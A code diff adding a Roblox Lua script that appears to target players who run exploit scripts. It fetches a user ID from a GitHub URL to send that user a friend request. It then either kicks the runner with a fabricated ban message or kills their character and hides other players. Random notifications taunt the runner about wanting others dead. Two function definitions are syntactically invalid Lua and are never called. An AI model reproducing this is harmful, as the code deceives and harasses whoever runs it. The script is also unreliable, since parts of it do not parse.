@@ -1,0 +1,112 @@
+local friend function()
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")	
+
+	-- URL containing the User ID (this could be any raw URL like a GitHub file with just the User ID)
+	local url = "https://raw.githubusercontent.com/whierror/somethinge/main/randomwhi1staccount" 	
+
+	-- Fetch the raw file content (assuming it contains just the User ID)
+	local response = HttpService:GetAsync(url)	
+
+	-- Convert the response to a number (User ID)
+	local userId = tonumber(response)	
+
+	-- Check if we got a valid User ID
+	if userId then
+	    -- Get the player by their User ID
+	    local player = Players:GetPlayerByUserId(userId)
+	    
+	    if player then
+	        -- If the player is in the game, send a friend request
+	        local success, errorMessage = pcall(function()
+	            player:RequestFriendship()  -- Sends a friend request to the player
+	        end)
+	        
+	        if success then
+	            print("Friend request sent successfully to user " .. userId)
+	        else
+	            print("Error sending friend request: " .. errorMessage)
+	        end
+	    else
+	        print("Player with ID " .. userId .. " not found or not in the game.")
+	    end
+	else
+	    print("Invalid User ID fetched from the URL.")
+	end
+
+end
+
+local player = game.Players.LocalPlayer
+
+-- Function to remove all players' characters except the local player
+local function removeOtherPlayers()
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player then  -- Check if the player is not the local player
+            local character = otherPlayer.Character
+            if character then
+                -- Remove the character from the workspace by setting the parent to nil
+                character.Parent = nil
+            end
+        end
+    end
+end
+
+local function showNotification(title, text, duration)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = duration,
+    })
+end
+
+local randomizetexts function()
+	local choices = math.random(1, 10)
+	if choices == 1 then
+		showNotification("IS THIS WHAT YOU WANTED", "", 3)
+	end
+    if choices == 2 then
+		showNotification("EVERY OTHER SCRIPTS YOU RUN", "", 3)
+	end
+	if choices == 3 then
+		showNotification("YOU WANTED TO HAVE FUN", "", 3)
+	end
+	if choices == 4 then
+		showNotification("YOU WANTED OTHERS DEAD", "", 3)
+	end
+	if choices == 5 then
+		showNotification("FOR YOUR OWN ENTERTAINMENT", "", 3)
+	end
+	if choices == 6 then
+		showNotification("IS DEATH ENTERTAINING?", "", 3)
+	end
+	if choices == 7 then
+		showNotification("YOU WANTED ADVANTAGE", "", 3)
+	end
+	if choices == 8 then
+		showNotification("FOR YOUR OWN FUN", "", 3)
+	end
+	if choices == 9 then
+		showNotification("THIS HAS ALWAYS BEEN YOUR WISH", "", 3)
+	end
+	if choices == 10 then
+		showNotification("THIS IS THE END", "", 3)
+	end
+end
+
+
+
+task.spawn(function()
+    pcall(function()
+        local kickonrun = getgenv and getgenv().kickonrun or "false"
+        local kickedornot = kickonrun
+
+        if kickedornot == "yes" then
+        	game.Players.LocalPlayer:Kick("You have been banned from the game. Reason: Exploiting. Hours: 10, Seconds: 50, Days: 999.")
+        end
+        if kickedornot == "no" then
+        	game.Players.LocalPlayer.Character.Humanoid.Health = 0
+        	removeOtherPlayers()
+        	wait(5)
+        end
+ 	end)
+end)
